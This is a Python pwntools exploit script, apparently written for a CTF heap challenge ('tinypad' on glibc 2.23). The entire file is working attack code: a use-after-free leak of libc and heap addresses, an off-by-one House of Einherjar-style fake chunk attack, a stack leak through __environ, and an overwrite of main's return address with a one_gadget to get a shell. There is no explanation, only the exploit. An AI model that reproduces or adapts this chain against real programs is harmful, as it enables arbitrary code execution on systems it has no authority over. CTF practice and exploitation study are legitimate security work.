'''
huan_attack_pwn
'''

import sys
from pwn import *
# from LibcSearcher import *
# from ctypes import *
context(arch='amd64', os='linux', log_level='debug')
# context(arch='i386' , os='linux', log_level='debug')
binary = './pwn'
libc = "/home/yhuan/Desktop/pwn_tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6"
# host, port = ":".split(":")

print(('\033[31;40mremote\033[0m: (y)\n'
    '\033[32;40mprocess\033[0m: (n)'))

if sys.argv[1] == 'y':
    r = remote(host, int(port))
else:
    r = process(binary)

# r = gdb.debug(binary)
# libc = cdll.LoadLibrary(libc)
libc = ELF(libc)
elf = ELF(binary)
# srand = libc.srand(libc.time(0)) #设置种子

default = 1
se      = lambda data                     : r.send(data)
sa      = lambda delim, data              : r.sendafter(delim, data)
sl      = lambda data                     : r.sendline(data)
sla     = lambda delim, data              : r.sendlineafter(delim, data)
rc      = lambda numb=4096                : r.recv(numb)
rl      = lambda time=default             : r.recvline(timeout=time)
ru      = lambda delims, time=default     : r.recvuntil(delims,timeout=time)
rpu     = lambda delims, time=default     : r.recvuntil(delims,timeout=time,drop=True)
uu32    = lambda data                     : u32(data.ljust(4, b'\0'))
uu64    = lambda data                     : u64(data.ljust(8, b'\0'))
lic     = lambda data                     : uu64(ru(data)[-6:])
padding = lambda length                   : b'Yhuan' * (length // 5) + b'Y' * (length % 5)
lg      = lambda var_name                 : log.success(f"{var_name} ：0x{globals()[var_name]:x}")
prl     = lambda var_name                 : print(len(var_name))
debug   = lambda command=''               : gdb.attach(r,command)
it      = lambda                          : r.interactive()



def Add(size,content):
    sla("(CMD)>>> ",b'A')
    sla("(SIZE)>>> ",str(size))
    sla("(CONTENT)>>> ",content)

def Del(index):
    sla("(CMD)>>> ",b'D')
    sla("(INDEX)>>> ",str(index))

def Edi(index,content):
    sla("(CMD)>>> ",b'E')
    sla("(INDEX)>>> ",str(index))
    sla("(CONTENT)>>> ",content)
    sla("(Y/n)>>> ",b'Y')


Add(0x80,padding(0x80))
Add(0x40,padding(0x40))
Add(0x40,padding(0x40))
Add(0xf0,padding(0xf0))

Del(1)
ru("#   INDEX: 1\n")
ru("# CONTENT: ")
unsortedbin_addr = u64(rc(6).ljust(8,b'\x00'))
lg('unsortedbin_addr')

main_arena = unsortedbin_addr - 88
libc_base = main_arena - 0x3C4B20
lg('libc_base')
Del(3)
Del(2)
ru("#   INDEX: 2\n")
ru("# CONTENT: ")
heap_addr = u64(rc(3).ljust(8,b'\x00'))
lg('heap_addr')
# pause()
heap_base = heap_addr - 0xe0
lg('heap_base')
Del(4)

tinypad = 0x602040
offset = heap_base - tinypad

Add(0x18,b'a'*0x18)
Add(0xf0,b'b'*0xf0)
Add(0x100,b'c'*0xf8)
Add(0x100,b'd'*0x100)

for i in range(len(p64(offset))-len(p64(offset).strip(b'\x00'))+1):
    Edi(1,b'b'*0x10+p64(offset).strip(b'\x00').rjust(8-i,b'f'))

pl1 = padding(0x20) + p64(0) + p64(0x101) + p64(tinypad+0x20) + p64(tinypad+0x20)
Edi(2,pl1)
Del(2)
pl2 = b'b'*0x20 + p64(0) + p64(0x101) + p64(tinypad+0x30) + p64(tinypad+0x30)
Edi(3,pl2)


env = libc_base + libc.sym['__environ']
pl3 = b'c'*0xd0 + p64(0x18) + p64(env) + p64(0xf0) + p64(0x602148)
Add(0xf0,pl3)
# debug()

ogg = [0xf03a4,0x4527a,0xf1247]
og = libc_base + ogg[2]

ru("#   INDEX: 1\n")
ru("# CONTENT: ")
stack_addr = u64(rc(6).ljust(8,b'\x00'))
lg('stack_addr')

main_ret = stack_addr - 8*30
Edi(2,p64(main_ret))
Edi(1,p64(og))
sl(b'Q')

it()
